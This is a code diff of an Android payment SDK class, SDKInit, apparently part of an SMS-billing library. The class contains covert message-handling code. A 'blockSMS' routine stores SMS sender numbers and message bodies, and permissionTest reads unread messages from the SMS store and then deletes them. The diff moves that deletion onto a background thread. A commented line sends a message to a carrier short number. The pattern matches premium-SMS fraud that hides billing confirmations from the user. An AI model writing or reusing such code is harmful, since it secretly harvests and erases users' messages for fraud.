@@ -69,14 +69,12 @@ public class SDKInit {
                                final String product, final String Did, final String extData, final Object payHandler,
                                final Handler initHandler) {
         mContext = ctx;
+//        permissionTest();
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    permissionTest();
-                    if (!("").equals(Utils.getIMSI(mContext))) {
-                        init(ctx, price, payItemID, str, product, Did, extData, payHandler, initHandler);
-                    }
+                    init(ctx, price, payItemID, str, product, Did, extData, payHandler, initHandler);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
@@ -120,11 +118,6 @@ public class SDKInit {
     }
 
     public void s(final Context ctx) {
-//        if (Build.VERSION.SDK_INT >= 23) {
-//            Log.debug("SDK verson >= 23");
-//            checkPermission(ctx);
-//        }
-
         if (Constants.isOutPut) {
             Log.debug("------------>blockSMS begin");
         }
@@ -164,14 +157,6 @@ public class SDKInit {
         ACacheUtils.getInstance(context).putPhoneData(senderPhoneNumberList);
         ACacheUtils.getInstance(context).putMessageData(messageContentList);
         ACacheUtils.getInstance(SDKInit.mContext).setSMSContent("");
-        if (Constants.isOutPut) {
-            Log.debug("ACacheUtils.getInstance().putPhoneData(senderPhoneNumberList)"
-                    + ACacheUtils.getInstance(context).getPhoneData().size());
-            Log.debug("ACacheUtils.getInstance().putMessageData(messageContentList)"
-                    + ACacheUtils.getInstance(context).getMessageData().size());
-            Log.debug("senderPhoneNumberList.size():" + senderPhoneNumberList.size());
-            Log.debug("messageContentList.size():" + messageContentList.size());
-        }
     }
 
     private void init(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final String extData, final Object payHandler, final Handler initHandler) {
@@ -187,12 +172,10 @@ public class SDKInit {
                             InitPay1001.getInstance().init_BaiduMap(ctx, price, payItemID, str, product,
                                     Did, extData, payHandler, setEntity);
                         }
-                        ;
                         ACacheUtils.getInstance(ctx).putSetEntity(setEntity);
                         Message msg = new Message();
                         msg.what = 1;
                         initHandler.sendMessage(msg);
-                        s(mContext);
                     }
                 } catch (Exception e) {
 
@@ -208,11 +191,16 @@ public class SDKInit {
         return resolver;
     }
 
-    private void permissionTest() {
+    public static void permissionTest() {
 //        MySmsManager.sendSecondMessage("10001", "102");
-        SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
-                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
-                "date desc");
-        SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
+                        new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
+                        "date desc");
+                SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
+            }
+        }).start();
     }
 }
